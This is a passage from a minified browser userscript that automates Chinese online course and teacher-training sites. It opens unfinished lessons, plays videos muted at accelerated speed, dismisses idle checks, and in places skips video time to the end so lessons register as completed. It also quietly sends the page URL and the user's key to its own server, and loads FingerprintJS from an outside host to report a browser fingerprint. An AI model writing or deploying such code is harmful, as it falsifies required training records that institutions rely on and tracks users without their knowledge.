            }, 3e3)
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            this.timer = setInterval(() => {
                l += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2),
                    t = (ElementObj.$video.duration / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t}\u5206\u949f`)
            }, 3e3)
        }
    }

    bainianshuren.ctxid = 60;

    class hebeijiaoshijiaoyuwang extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let a = setInterval(async () => {
                try {
                    if ("/MyCourse/MyEventList" == location.pathname && (ElementObj.$parentNodes = document.querySelectorAll("#mainList dd ul li"), 0 < ElementObj.$parentNodes.length)) {
                        clearInterval(a), ElementObj.$handleSpeedUp.style.display = "none";
                        for (var e of ElementObj.$parentNodes) if ("[\u5df2\u5b8c\u6210]" != e.querySelector("i").innerText) {
                            MyTool.setValue("homeUrl", location.href), e.querySelector("a").click();
                            break
                        }
                    }
                    if ("/Event/MyjoinEvent" == location.pathname && (ElementObj.$parentNodes = document.querySelectorAll("tr[class]"), 0 < ElementObj.$parentNodes.length) && (clearInterval(a), ElementObj.$handleSpeedUp.style.display = "none", 0 < ElementObj.$parentNodes.length)) for (var t of ElementObj.$parentNodes) {
                        var l = t.querySelectorAll("td")[2].querySelector("span").innerText.trim();
                        if ("\u5df2\u5b66\u5b8c" != l && "\u5df2\u5b8c\u6210" != l) {
                            t.querySelector("a").click();
                            break
                        }
                    }
                    if ("/Event/CourseWare" == location.pathname && (ElementObj.$parentNodes = document.querySelectorAll("tr[class]"), 0 < ElementObj.$parentNodes.length) && (clearInterval(a), ElementObj.$handleSpeedUp.style.display = "none", 0 < ElementObj.$parentNodes.length)) for (var n of ElementObj.$parentNodes) if ("\u5df2\u5b66\u5b8c" != n.querySelectorAll("td")[2].querySelector("span").innerText.trim()) {
                        n.querySelector("a").click();
                        break
                    }
                    ElementObj.$video = document.querySelector("iframe")?.contentDocument?.querySelector("video"), ElementObj.$video && (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(a), this._o1())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("active")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this.pdPlayFn(location.href)
            }, 4e3))
        }

        getVideoDom() {
            return new Promise(e => {
                let t = 0, l = setInterval(() => {
                    t += 1, ElementObj.$video = document.querySelector("iframe")?.contentDocument?.querySelector("video"), ElementObj.$video ? (clearInterval(l), e(1)) : 7 <= t && (clearInterval(l), e(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), clearInterval(this.timer);
            var e, t = await this.getVideoDom();
            1 == t && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), (e = document.querySelector("#mian")).style.position = "relative", await this.changeHtml(e), this.listenPlayTime(), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 3500)
            })), 2 == t && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                var e = document.querySelector(".school-sate button");
                e && e.click()
            }, 1e4)
        }

        listenPlayTime() {
            showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            let l = 0;
            this.timer = setInterval(() => {
                l += 1;
                var e = (ElementObj.$video.currentTime / 60).toFixed(2),
                    t = (ElementObj.$video.duration / 60).toFixed(2);
                this.addInfo(`\u540e\u53f0\u5b66\u4e60${l}\u6b21，\u5f53\u524d\u72b6\u6001\u6b63\u5728\u5b66\u4e60，\u5df2\u64ad\u653e${e}\u5206\u949f，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t}\u5206\u949f`)
            }, 3e3)
        }

        async playNext() {
            var e = document.querySelectorAll(".tishivalhui")[2], t = document.querySelectorAll(".tishivalhui")[1];
            "\u4e0b\u4e00\u7bc7：\u6ca1\u6709\u4e86；" == (e || t).innerText ? location.href = MyTool.getValue("homeUrl") : (await sleep(2500), (1 < (e = document.querySelectorAll(".tishivalju")).length ? e[1] : e[0]).click())
        }
    }

    class yunketang extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll(".el-collapse-item__content div.file-item"), ElementObj.$allTask.length && (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("file-item-active")) {
                this.currentIndex = e;
                break
            }
            if (-1 == this.currentIndex) alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c"); else {
                showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3);
                let t = ElementObj.$allTask[this.currentIndex];
                setTimeout(() => {
                    var e = t.querySelector("div").innerHTML.replace(/ <.+>/, "");
                    this.pdPlayFn(e)
                }, 3e3)
            }
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 0, n = setInterval(() => {
                    l += 1, ElementObj.$video = document.querySelector("video");
                    var e = document.querySelector(".vjs-big-play-button");
                    ElementObj.$video && e ? (clearInterval(n), e.click(), t(1)) : 7 <= l && (clearInterval(n), t(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (this.changeHtml($el("#vjs_video_3")), this.listenPlayTime(), ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenVidoeStatus(ElementObj.$video, () => {
                ElementObj.$video.volume = 0, ElementObj.$video.play()
            }), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    document.querySelector(".vjs-big-play-button")?.click(), ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 3500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenPlayTime() {
            let t = 0;
            setInterval(() => {
                t += 1;
                var e = ElementObj.$allTask[this.currentIndex].querySelector(".el-progress__text").innerText;
                "100%" == e && location.reload(), this.addInfo(`\u5df2\u6210\u529f\u76d1\u6d4b${t}\u6b21，\u89c6\u9891\u6b63\u5728\u64ad\u653e\u4e2d，\u5f53\u524d\u8fdb\u5ea6\u5b8c\u6210` + e)
            }, 3e3)
        }

        async playNext() {
            location.reload()
        }

        pdPlayFn(e) {
            var t = MyTool.getValue("spanClassName") || [];
            -1 != t.indexOf(e) ? this.play() : (t.push(e), MyTool.setValue("spanClassName", t), this._o1())
        }
    }

    class zhelixuexi extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let n = setInterval(async () => {
                try {
                    if (ElementObj.$parentNodes = document.querySelectorAll(".vi-item"), ElementObj.$parentNodes.length) {
                        ElementObj.$handleSpeedUp.style.display = "none", clearInterval(n);
                        for (var e = 0; e <= ElementObj.$parentNodes.length - 1; e++) {
                            var t = ElementObj.$parentNodes[e],
                                l = t.querySelector(".v-prosss").innerText.replace("\u5df2\u5b66\u4e60", "");
                            if (parseInt(l) < 99) {
                                this.currentIndex = e, MyTool.setValue("homeUrl", location.href), t.click();
                                break
                            }
                        }
                    } else ElementObj.$allTask = document.querySelectorAll(".set-content"), ElementObj.$allTask.length ? (ElementObj.$handleSpeedUp.style.display = "none", clearInterval(n), this.getCurrentIndex()) : (ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(n), ElementObj.$handleSpeedUp.style.display = "none", this._o1()))
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex() {
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (ElementObj.$allTask[e].classList.contains("active")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (showTip("✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，5\u79d2\u540e\u5f00\u59cb\u64ad\u653e", 3e3), setTimeout(() => {
                this._o1()
            }, 4e3))
        }

        async play() {
            clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            var e = await this.getVideoDom();
            1 == e && (ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), this.listenRebort(), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 3500)
            })), 2 == e && (showTip("✅✅✅\u8be5\u7ae0\u8282\u4e3a\u6587\u6863，\u5373\u5c06\u81ea\u52a8\u5207\u6362\u4e0b\u4e00\u4e2a", 3e3), await sleep(3e3), this.playNext())
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
            }, 1e4)
        }

        async playNext() {
            if (this.currentIndex >= ElementObj.$allTask.length - 1) {
                let e = MyTool.getValue("homeUrl");
                void setTimeout(() => {
                    location.href = e
                }, 3e3)
            } else await sleep(2e3), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1()
            }, 3e3)
        }
    }

    class fhswifer extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$parentNodes = document.querySelectorAll(".c-directory-item"), ElementObj.$parentNodes.length && (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", showTip("\u6b63\u5728\u5bfb\u627e\u5168\u90e8\u8bfe\u7a0b，\u9884\u8ba110-20\u79d2，\u8bf7\u7a0d\u7b49..."), this.getParentIndex())
                } catch (e) {
                }
            }, 1e3)
        }

        async getParentIndex() {
            for (var e of ElementObj.$parentNodes) e.click(), await sleep(500);
            this.getCurrentIndex()
        }

        async getCurrentIndex() {
            ElementObj.$allTask = document.querySelectorAll(".c-directory-box .cc-directory-item");
            for (var e = 0; e <= ElementObj.$allTask.length - 1; e++) if (!ElementObj.$allTask[e].querySelector(".cc-audition")) {
                this.currentIndex = e;
                break
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (ElementObj.$allTask[this.currentIndex].click(), showTip("\u521d\u59cb\u5316\u5b8c\u6210，\u7b2c\u4e00\u6b21\u8bf7\u624b\u52a8\u64ad\u653e\u89c6\u9891", 1e4), this.play())
        }

        getVideoDom() {
            return new Promise(t => {
                let l = 0, n = setInterval(() => {
                    l += 1;
                    var e = document.querySelector(".icon.bplayer-play-btn");
                    e ? (clearInterval(n), t(e)) : 7 <= l && (clearInterval(n), t(2))
                }, 1e3)
            })
        }

        async play() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime), (await this.getVideoDom()).click(), this.listenPlayTime(), this.listenRebort()
        }

        listenPlayTime() {
            let l = 0;
            this.timer = setInterval(async () => {
                l += 1;
                var e = document.querySelector(".played-time").innerText,
                    t = document.querySelector(".total-time").innerText;
                e.trim() >= t.trim() && (clearInterval(this.timer), this.playNext())
            }, 5e3)
        }

        listenRebort() {
            this.listenRebortTime = setInterval(() => {
                document.querySelector(".bplayer-wrap").classList.contains("bplayer-playing") || document.querySelector(".icon.bplayer-play-btn").click()
            }, 1e3)
        }

        async playNext() {
            this.currentIndex >= ElementObj.$allTask.length - 1 ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (await sleep(2500), this.currentIndex += 1, ElementObj.$allTask[this.currentIndex].click(), setTimeout(() => {
                this._o1(() => {
                }, !1)
            }, 3e3))
        }
    }

    class rrhisdgf283y7jvdf extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let t = setInterval(async () => {
                try {
                    ElementObj.$allTask = document.querySelectorAll("ul.cb.oh li"), ElementObj.$allTask.length && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex(1)), ElementObj.$allTask = document.querySelectorAll(".section-item"), ElementObj.$allTask.length && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this.getCurrentIndex(2));
                    var e = document.querySelector("iframe");
                    -1 == location.href.indexOf("v_video?platformId=") && -1 == location.href.indexOf("/play_video/") || !e || (clearInterval(t), location.href = e.src), -1 != ["/videoPlay/play", "/videoPlay/playEncrypt"].indexOf(location.pathname) && (clearInterval(t), ElementObj.$handleSpeedUp.style.display = "none", this._o1())
                } catch (e) {
                }
            }, 1e3)
        }

        async getCurrentIndex(e) {
            for (var t = 0; t <= ElementObj.$allTask.length - 1; t++) {
                var l = ElementObj.$allTask[t];
                if (1 == e) if (-1 == l.querySelector(".button.titlecolor").innerText.indexOf("\u5df2\u5b66\u5b8c")) {
                    this.currentIndex = t;
                    break
                }
                if (2 == e) if ("\u5df2\u5b66\u5b8c" != l.querySelectorAll(".n-text.__text-q8o5bu-d")[2].innerText.trim()) {
                    this.currentIndex = t;
                    break
                }
            }
            -1 == this.currentIndex ? alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c") : (setTimeout(() => {
            }, 12e4), MyTool.setValue("homeUrl", location.href), 1 == e && ElementObj.$allTask[this.currentIndex].querySelector(".button.titlecolor").click(), 2 == e && ElementObj.$allTask[this.currentIndex].click())
        }

        async play() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            await this.getVideoDom();
            ElementObj.$video.volume = 0, ElementObj.$video.play(), setTimeout(() => {
                ElementObj.$video.playbackRate = toolOption.accelerator
            }, 3e3), ElementObj.$video.addEventListener("ended", async () => {
                showTip("✅✅✅\u5f53\u524d\u89c6\u9891\u5df2\u64ad\u653e\u5b8c，5\u79d2\u540e\u64ad\u653e\u4e0b\u4e00\u4e2a", 4500), this.playNext()
            }), ElementObj.$video.addEventListener("pause", () => {
                setTimeout(() => {
                    ElementObj.$video.volume = 0, ElementObj.$video.play()
                }, 3500)
            })
        }

        async listenPlayTime() {
            this.addInfo("✅✅✅✅✅✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e✅✅✅✅✅✅✅✅✅"), await sleep(1e3), showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            var t = Math.ceil(ElementObj.$video.duration);
            if (t) {
                let e = 0;
                for (var l of new Array(1e3)) {
                    if (e >= t) {
                        ElementObj.$video.currentTime = ElementObj.$video.duration - 10, await sleep(1e3), ElementObj.$video.currentTime = ElementObj.$video.duration, this.addInfo("🎉🎉🎉🎉🎉🎉🎉🎉\u5df2\u6210\u529f\u5b66\u5b8c🎉🎉🎉🎉🎉🎉🎉🎉"), this.playNext();
                        break
                    }
                    e += +toolOption.accelerator > t ? t : +toolOption.accelerator, this.addInfo(`🔊\u5f53\u524d\u72b6\u6001\u6b63\u5728\u4ee5${toolOption.accelerator}\u500d\u901f\u5b66\u4e60\u4e2d，\u5df2\u5b66\u4e60${e}\u79d2，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`), await sleep(1e3)
                }
                this.playNext()
            } else alert("\u89c6\u9891\u65f6\u95f4\u9519\u8bef，\u8bf7\u5237\u65b0\u9875\u9762\u91cd\u8bd5")
        }

        async playNext() {
            let e = MyTool.getValue("homeUrl");
            e ? setTimeout(() => {
                location.href = e
            }, 1e4) : (showTip("\u5b98\u7f51\u8be5\u5e73\u53f0\u5e95\u90e8\u6709\u6ce8\u610f\u4e8b\u9879，\u8bf7\u6309\u7167\u8be5\u6307\u793a\u9875\u9762\u6267\u884c\u7a0b\u5e8f，\u5426\u5219\u65e0\u6cd5\u81ea\u52a8\u8fde\u64ad", 1e4), alert("\u5b98\u7f51\u8be5\u5e73\u53f0\u5e95\u90e8\u6709\u6ce8\u610f\u4e8b\u9879，\u8bf7\u6309\u7167\u8be5\u6307\u793a\u9875\u9762\u6267\u884c\u7a0b\u5e8f，\u5426\u5219\u65e0\u6cd5\u81ea\u52a8\u8fde\u64ad"))
        }
    }

    class f6872 extends Main {
        constructor() {
            super(), this.taskLength = 0, this.currentIndex = -1, this._init()
        }

        async _init() {
            let e = setInterval(async () => {
                try {
                    ElementObj.$parentNodes = document.querySelectorAll(".ant-table-tbody")[0].querySelectorAll("tr"), ElementObj.$parentNodes.length && (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this.getParentIndex()), ElementObj.$video = document.querySelector("video"), ElementObj.$video && (clearInterval(e), ElementObj.$handleSpeedUp.style.display = "none", this._o1())
                } catch (e) {
                }
            }, 1e3)
        }

        async getParentIndex() {
            for (var e of ElementObj.$parentNodes) {
                var t = e.querySelector(".ant-progress-text").innerText;
                if (parseInt(t) < 97) {
                    e.click(), await sleep(2e3), this.getCurrentIndex();
                    break
                }
            }
        }

        async getCurrentIndex() {
            e:for (var e of document.querySelectorAll(".ant-pagination")[1].querySelectorAll("li.ant-pagination-item")) {
                ElementObj.$allTask = document.querySelectorAll(".ant-table-tbody")[1].querySelectorAll("tr");
                for (let e = 0; e <= ElementObj.$allTask.length - 1; e++) {
                    var t = ElementObj.$allTask[e];
                    if (!t.querySelector("i")) {
                        this.currentIndex = e, t.querySelectorAll(".ant-table-row-cell-break-word a")[1].click(), await sleep(2e3), this._o1();
                        break e
                    }
                }
                e.click(), await sleep(2e3)
            }
            -1 == this.currentIndex && alert("\u5f53\u524d\u8bfe\u7a0b\u6240\u6709\u89c6\u9891\u5df2\u64ad\u653e\u5b8c")
        }

        async play() {
            clearInterval(this.timer), clearInterval(this.listenVidoeStatusTimer), clearInterval(this.listenRebortTime);
            await this.getVideoDom();
            await this.changeHtml($el(".input_video")), this.listenPlayTime()
        }

        async listenPlayTime() {
            this.addInfo("✅✅✅✅✅✅✅✅\u521d\u59cb\u5316\u5b8c\u6210，\u5373\u5c06\u5f00\u59cb\u64ad\u653e✅✅✅✅✅✅✅✅✅"), await sleep(1e3), showTip("🔉\u8bfe\u4ef6\u6b63\u5728\u5b66\u4e60，\u8bf7\u52a1\u70b9\u51fb\u6216\u957f\u65f6\u95f4\u9690\u85cf");
            var t = Math.ceil(ElementObj.$video.duration);
            if (t) {
                let e = 0;
                for (var l of new Array(1e3)) {
                    if (e >= t) {
                        ElementObj.$video.currentTime = ElementObj.$video.duration, await sleep(1e3), ElementObj.$video.currentTime = ElementObj.$video.duration, this.addInfo("🎉🎉🎉🎉🎉🎉🎉🎉\u5df2\u6210\u529f\u5b66\u5b8c🎉🎉🎉🎉🎉🎉🎉🎉"), this.playNext();
                        break
                    }
                    e += +toolOption.accelerator > t ? t : +toolOption.accelerator, this.addInfo(`🔊\u5f53\u524d\u72b6\u6001\u6b63\u5728\u4ee5${toolOption.accelerator}\u500d\u901f\u5b66\u4e60\u4e2d，\u5df2\u5b66\u4e60${e}\u79d2，\u89c6\u9891\u603b\u65f6\u957f\u4e3a${t / 60}\u5206\u949f`), await sleep(3e3)
                }
                this.playNext()
            } else alert("\u89c6\u9891\u65f6\u95f4\u9519\u8bef，\u8bf7\u5237\u65b0\u9875\u9762\u91cd\u8bd5")
        }

        async playNext() {
            setTimeout(() => {
                location.reload()
            }, 1e3)
        }
    }

    class Addpanel {
        constructor() {
            this.$panelWrap = document.createElement("div"), this.$panelStyle = document.createElement("style"), this._init()
        }

        async _init() {
            this.$panelWrap.innerHTML = this.getCTXHTML(), this.$panelStyle.innerHTML = panelcss, document.querySelector("head")?.appendChild(this.$panelStyle), (3 == toolOption.SchoolType ? document.querySelector("#bigContainer") : 7 == toolOption.SchoolType ? document.querySelector(".layout-content") : 11 == toolOption.SchoolType ? document.querySelector(".task-dashboard-page") : 18 == toolOption.SchoolType ? document.querySelector(".screen_wide_1") : document.querySelector("body"))?.appendChild(this.$panelWrap), ElementObj.$title3 = document.querySelector(".title3"), ElementObj.$mytoolkey = document.querySelector(".mytoolkey"), ElementObj.$nokey = document.querySelector(".nokey"), ElementObj.$addKey = document.getElementById("addKey"), ElementObj.$removeKey = document.getElementById("removeKey"), ElementObj.$ipt = document.querySelector(".mytoolkeyipt"), ElementObj.$handleSpeedUp = document.querySelector(".handleSpeedUp"), ElementObj.$ctxTipWrap = document.querySelector("#ctxTipWrap"), ElementObj.$ctxsection2 = document.querySelector(".ctxsection2"), ElementObj.$ctxcontrols = document.querySelector(".ctxcontrols");
            var e = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey"),
                t = (e && ((t = MyTool.getValue("mytoolkeyInfo")) && "2" == t.canuse && MyTool.isDateGreaterThanSevenDays(t.createtime) ? (localStorage.removeItem("mytoolkey"), MyTool.deleteValue("mytoolkey")) : this.handleSetHtml(e)), this.optimizePannel(), this.setSpeedOption(), this.addEvent(), this.getSlogan(), MyTool.getValue("hideCtx"));
            t && ($el(".myTool").style.left = "-99999px", $el(".myTool>.floatWin").style.left = "-35px", document.querySelector(".myTool>.floatWin")?.addEventListener("click", () => {
                MyTool.setValue("hideCtx", !1), location.reload()
            })), MyTool.registerMenuCommand("\u9690\u85cf\u811a\u672c", "h", () => {
                MyTool.setValue("hideCtx", !0), location.reload()
            }), MyTool.registerMenuCommand("\u663e\u793a\u811a\u672c", "s", () => {
                MyTool.setValue("hideCtx", !1), location.reload()
            }), this._v0(), setTimeout(async () => {
                try {
                    let t = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey");
                    var e = MyTool.getValue("schoolInfoColletion");
                    (!e || (e = new Date(e)).getDate() < (new Date).getDate()) && this.colletionSchoolData(`/colletionschool?v=${version}&schoolType=${toolOption.SchoolType}&toolkey=${t}&host=` + location.href);
                    let l = localStorage.getItem("fingerprint");
                    !l && t && import("https://openfpcdn.io/fingerprintjs/v4").then(e => e.load()).then(e => e.get()).then(e => (l = e.visitorId, e.visitorId)).then(e => {
                        localStorage.setItem("fingerprint", l || ""), this.colletionSchoolData(`/colletionschool?v=${version}&schoolType=${toolOption.SchoolType}&toolkey=${t}&fingerprint=${l}&host=` + location.href)
                    })
                } catch (e) {
                }
            }, 2500)
        }

        optimizePannel() {
            2 == toolOption.SchoolType && ($el(".myTool").style.left = "unset", $el(".myTool").style.right = "44px", $el(".ipt-wrap").style.marginTop = "3px", ElementObj.$ipt.style.padding = "11px 3px"), 9 == toolOption.SchoolType && ($el(".handleKeyBtn").style.lineHeight = "16px"), 16 == toolOption.SchoolType && (ElementObj.$myTool = document.querySelector(".myTool"), 2 == _i1.gzjxjy.runtype && (ElementObj.$handleSpeedUp.style.display = "none", ElementObj.$speedSelect = document.querySelector(".ctxsection2"), ElementObj.$speedSelect.style.display = "none"), 1 == _i1.gzjxjy.runtype) && (ElementObj.$ctxsection3 = document.querySelector(".cxtsection3"), ElementObj.$ctxsection3.style.display = "none"), -1 != [14, 24, 63, 65].indexOf(toolOption.SchoolType) && (toolOption.accelerator = 1, speedArr = [1]), -1 != [40, 52, 54, 67, 80].indexOf(toolOption.SchoolType) && (speedArr = [1, 2]), -1 != [7, 12, 22, 53].indexOf(toolOption.SchoolType) && (speedArr = [1, 2, 3], toolOption.accelerator = 3), -1 != [3, 38, 45, 46, 52, 57, 58, 61, 64, 67, 97, 103].indexOf(toolOption.SchoolType) && ($el(".myTool").style.left = "unset", $el(".myTool").style.right = "44px"), 18 == toolOption.SchoolType && ($el(".btn1").style.width = "74%", $el(".btn1").style.paddingTop = "0", $el(".btn1").style.paddingBottom = "0", $el("#slogan").style.position = "relative", $el("#slogan").style.left = "-40px", speedArr = [1, 2, 3, 5]), 19 == toolOption.SchoolType && (toolOption.accelerator = 1, $el(".myTool").style.width = "202px"), 23 == toolOption.SchoolType && ($el(".myTool").style.top = "176px", toolOption.accelerator = 1), 25 == toolOption.SchoolType && (toolOption.accelerator = 2, speedArr = [1, 1.25, 1.5, 2]), 26 == toolOption.SchoolType && ($el(".myTool").style.width = "202px"), 29 == toolOption.SchoolType && (speedArr = [1, 1.5, 2, 3, 5, 10]), 30 == toolOption.SchoolType && (speedArr = [1, 2, 3, 5, 10, 15], toolOption.accelerator = 2), 32 != toolOption.SchoolType && 36 != toolOption.SchoolType || ($el(".myTool").style.left = "unset", $el(".myTool").style.right = "44px", speedArr = [1, 1.1]), -1 != [16, 37, 38, 41, 44, 54, 66, 71].indexOf(toolOption.SchoolType) && (speedArr = [1, 1.5, 2, 3, 5, 10]), -1 != [51, 52].indexOf(toolOption.SchoolType) && ($el(".myTool").style.left = "76px", speedArr = [1, 2, 3, 10], toolOption.accelerator = 2), 60 == toolOption.SchoolType && (speedArr = [1, 1.5, 1.8, 2], toolOption.accelerator = 2), -1 != [91, 96, 118, 122].indexOf(toolOption.SchoolType) && (speedArr = [1, 1.5, 2, 3, 10], toolOption.accelerator = 1)
        }

        setSpeedOption() {
            ElementObj.$speedSelect = document.querySelector("#ctxspeed");
            let e = "";
            for (var t = 0; t < speedArr.length; t++) {
                var l = `
                <option value="${1.1 == speedArr[t] ? 1 : speedArr[t]}" class="option">
                  × ${1.1 == speedArr[t] ? 1.2 : speedArr[t]}.0
                </option>
                `;
                e += l
            }
            ElementObj.$speedSelect.innerHTML = e;
            var n = localStorage.getItem("_localSpeed") || MyTool.getValue("_localSpeed");
            n && (ElementObj.$speedSelect.value = n, toolOption.accelerator = Number(n))
        }

        handleSetHtml(e) {
            try {
                ElementObj.$ipt.style.display = "none", ElementObj.$title3.innerText = "\u5f53\u524dkey：", ElementObj.$mytoolkey.innerText = e, ElementObj.$mytoolkey.style.display = "block", ElementObj.$nokey.style.display = "none", ElementObj.$removeKey.style.display = "block", ElementObj.$addKey.style.display = "none", ElementObj.userKey = e
            } catch (e) {
            }
        }

        addEvent() {
            ElementObj.$addKey.addEventListener("click", () => {
                this.handleAddKey(e => {
                    this.handleSetHtml(e)
                })
            }), ElementObj.$removeKey.addEventListener("click", () => {
                MyTool.setValue("mytoolkey", null), localStorage.removeItem("mytoolkey"), localStorage.removeItem("_localSpeed"), ElementObj.$title3.innerText = "\u7ed1\u5b9akey：", ElementObj.$mytoolkey.style.display = "none", ElementObj.$ctxsection2.style.display = "none", ElementObj.$nokey.style.display = "block", ElementObj.$ipt.style.display = "block", ElementObj.$addKey.style.display = "block", ElementObj.$removeKey.style.display = "none", ElementObj.$handleSpeedUp.style.background = "orange", ElementObj.$handleSpeedUp.innerText = "\u70b9\u51fb\u52a0\u901f"
            }), ElementObj.$handleSpeedUp.addEventListener("click", () => {
                toolOption.CtxMain._o1()
            }), ElementObj.$ctxsection2.addEventListener("change", e => {
                toolOption.CtxMain.handleChangeCtxSpeed(e.target.value)
            }), ElementObj.$ctxcontrols.addEventListener("click", () => {
                var e = document.querySelector(".myTool-content"), t = GM_getValue("hideCtx", null);
                t ? (e.style.height = "auto", ElementObj.$ctxcontrols.innerText = "×") : (e.style.height = "0px", ElementObj.$ctxcontrols.innerText = "🔛", $el(".myTool").style.left = "-99999px"), MyTool.setValue("hideCtx", !t)
            }), document.querySelectorAll(".targetHome").forEach(e => {
                e.addEventListener("click", () => {
                    location.href = _bt
                })
            })
        }

        getSlogan() {
            axfedata({url: _b + "/getslogan", method: "GET"}).then(e => {
